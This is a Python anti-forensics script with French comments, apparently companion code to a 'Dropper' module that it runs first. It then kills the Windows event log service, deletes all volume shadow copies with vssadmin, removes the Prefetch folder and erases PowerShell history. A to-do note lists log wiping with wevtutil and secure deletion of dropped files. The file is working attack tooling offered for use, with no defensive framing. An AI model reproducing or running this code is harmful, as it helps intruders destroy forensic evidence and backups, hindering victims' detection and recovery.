import os
import time
import sys
import re
import pyfiglet
import subprocess
import psutil
import Dropper
"""
A faire : 
Delete le prefetch
Supprimer les shadow copies
Delete l'exe
clear des logs windows ==> wevtutil cl system ; wevtutil cl application ; wevtutil cl security
delete les fichiers qui pourraient etre créé (Secure Delete) ==> Voir Sdelete
Delete les commandes powershell => Clear-History && C:\\Users\\Clément\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
"""
try:
	ascii_banner = pyfiglet.figlet_format("LET'S  HACK \n")
	print(ascii_banner)
except:
	pass




def delete_prefetch():
	windows = os.environ['WINDIR'] + "\Prefetch"
	commande = f'rm -r {windows}'
	"""
	commande_dir = f'ls {windows}'
	dir_ = os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande_dir}'\"")
	output_dir = dir_.read()
	print(output_dir)
	"""
	try:
		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'\"")
	except:
		pass
	#On attend 15 secondes le temps que le prefetch se créer.
	"""
	try:
		#dir C:\Windows\Prefetch
		#Permet de lister les prefetch
		prefetch_files = os.listdir(windows)
		for pf_file in prefetch_files:
		    if pf_file[:len_path_file] == file[-len_path_file:]:
		    	print("File found :" + pf_file)
		    	print(windows + "\\" + pf_file)
		    	try:
		    		os.remove(windows + "\\" + pf_file)
		    		print("Successfully deleted")
		    	except:
		    		print("Impossible to delete file")
		    	break
	except OSError as e:
		print(f"Os Error:{e}")
	"""

#Pour les VSS avec le cmd vssadmin List Shadows 
# Voir https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html#:~:text=Your%20shadow%20copies%20are%20generally,folder%20(hidden%20by%20default).
#Il faut etre admin

#os.system('vssadmin List Shadows')
def vss():
	
	try:
		volume = os.environ['SystemDrive']
		commande = f'vssadmin delete shadows /for={volume} /all /quiet'
		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'\"")

	except Exception as e:
		print(e)
		pass


def powershell_history():
	location = os.environ['appdata'] + "\\Microsoft\\Windows\\PowerShell\\PSReadline"
	try:
		os.popen('powershell.exe Clear-History')
		os.remove(location + "\\" + "ConsoleHost_history.txt")
		print("Successfully deleted")
	except:
		print("Le fichier n'existe pas")


def try_kill(pid):
    try:
        os.popen(f"powershell \"Start-Process powershell -Verb runas 'taskkill /PID {pid} /F '\"")
        return True
    except:
        return False

def disable_logs():
	#commande = 'auditpol /clear /y'
    #commande_disable_logs = "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId"
	disable_log = os.popen(""" powershell "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId" """)
	output = disable_log.read()
	output = int(output)
	print(output)
	if output == 0:
		pass
		return True
	else:
		if try_kill(output):
			time.sleep(5)
			get_id_log = os.popen(""" powershell "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId" """)
			output_id = get_id_log.read()
			print(output_id)
			output_id = int(output_id)
			if output_id == 0:
				print("C'est tout bon")
				return True
			else:
				print(u"Output ID != 0")
				return False
		else:
			print(u"Try Kill pas marché ")
			return False
"""
def clear_logs():
	commande = "wevtutil cl system && wevtutil cl application && wevtutil cl security"
"""
def main():
	if Dropper.main():
		if disable_logs():
			vss()
			delete_prefetch()
		powershell_history()
	test = input("Tapes sur  Enter ...")

main()
#Pour lister les répertoire et les envoyer
#dir /path/ >> %temp%/nom.txt
